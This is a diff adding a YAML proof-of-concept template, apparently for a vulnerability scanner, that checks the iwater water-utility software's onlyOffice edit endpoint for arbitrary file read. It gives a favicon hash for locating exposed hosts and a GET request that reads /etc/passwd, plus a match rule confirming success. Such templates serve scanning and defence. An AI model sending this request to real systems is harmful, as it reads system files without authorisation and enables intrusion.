@@ -1,0 +1,15 @@
+id: poc-yaml-iwater-onlyoffice-edit-anyfile-read
+info:
+  name: 水务通 onlyOffice-edit 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: iwater
+  hunter: favicon:"6e52d7ff19212bbc8f6eb44017c9100c"
+requests:
+- method: GET
+  path: /onlyOffice/edit?userName=admin&&url=/etc/passwd
+  expression: status_code == 200 && contains(body,"<title>passwd</title>") && contains(body,"type\x3a
+    \"desktop\"") && contains(body,"documentType")
+variables: {}
+transport: http
